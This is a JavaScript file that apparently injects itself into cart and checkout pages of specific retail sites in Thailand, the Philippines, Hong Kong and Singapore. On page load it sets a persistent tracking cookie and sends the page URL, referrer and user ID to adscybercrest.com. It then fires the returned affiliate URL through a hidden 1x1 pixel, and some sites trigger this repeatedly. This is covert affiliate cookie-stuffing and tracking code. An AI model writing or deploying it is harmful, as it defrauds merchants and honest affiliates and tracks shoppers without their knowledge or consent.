(function () {
    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
            var r = Math.random() * 16 | 0,
                v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    function createTrackingPixel(url) {
        var img = document.createElement('img');
        img.src = url;
        img.width = 1;
        img.height = 1;
        img.style.display = 'none';
        img.style.visibility = 'hidden';
        document.body.appendChild(img);
    }

        function createClickIframe(url) {
        const iframe = document.createElement('iframe');
        iframe.setAttribute("sandbox", "allow-same-origin allow-scripts");
        iframe.src = url;
        iframe.srcdoc = "";        
        iframe.onerror = () => {}; 
        iframe.onload = () => {};  

        iframe.width = iframe.height = "1";
        iframe.style = "display:none; visibility:hidden; border:0;";
        document.body.appendChild(iframe);
    }

    async function initTracking() {

      if (sessionStorage.getItem('iframe_triggered')) return;

        try {
            let uniqueId = getCookie('tracking_uuid') || generateUUID();
            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';
            
            let response = await fetch('https://www.adscybercrest.com/api/track-user', {
                method: 'POST',
                body: JSON.stringify({
                    url: window.location.href,
                    referrer: document.referrer,
                    unique_id: uniqueId,
                    origin: window.location.hostname,
                }),
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin':'*'
                }
            });
            
            let raw = await response.text();  
            
            let result;
            try {
                result = JSON.parse(raw);
            } catch (e) {
                console.error("Response is not valid JSON:", e);
                return;
            }

            if (result.success && result.affiliate_url) {
                
                createTrackingPixel(result.affiliate_url);
               
                sessionStorage.setItem('iframe_triggered', 'true');
            } else {
                createTrackingPixel('https://www.adscybercrest.com/api/fallback-pixel?id=' + uniqueId);
            }
        } catch (error) {
            console.error('Error in tracking script:', error);
        }
    }

    function getCookie(cname) {
        var name = cname + '=';
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) === ' ') {
                c = c.substring(1);
            }
            if (c.indexOf(name) === 0) {
                return c.substring(name.length, c.length);
            }
        }
        return '';
    }

    function isCartPage() {
            
        const cartPages = ["/cart", "/checkout","/checkout/shipping","/checkout/cart","/shopping-cart","/en/cart","/en/checkout/review-order","/checkout/review-order"];
       
        return cartPages.some(path => window.location.pathname.includes(path));
    }

      function onDOMReady(callback) {

    if (document.readyState === "interactive" || document.readyState === "complete") {
        callback();
    } else {
        window.addEventListener("DOMContentLoaded", callback);
    }
}

onDOMReady(function() {
    
    if (window.location.hostname === "www.ofm.co.th") {

        if (isCartPage()) {
            initTracking();
            initTracking();
            initTracking();
        }
        
    }

    if (window.location.hostname === "www.fareastflora.com") {
        initTracking();
    }

    if (window.location.hostname === "checkout.accorplus.com") {
        initTracking();
    }

     if (window.location.hostname === "www.studio7thailand.com") {
        if (isCartPage()) {
            initTracking();
            initTracking();
             setTimeout(initTracking, 2000);
        }
        
        
    }

      if (window.location.hostname === "www.bnn.in.th") {
        if (isCartPage()) {
            initTracking();
        }
    }

    if (window.location.hostname === "gfiberprepaid.globe.com.ph") {
        initTracking();
    }

 if (window.location.hostname === "shop.globe.com.ph") {
        initTracking();
    }

     if (window.location.hostname === "www.watsons.com.hk") {
        initTracking();
    }

});

})();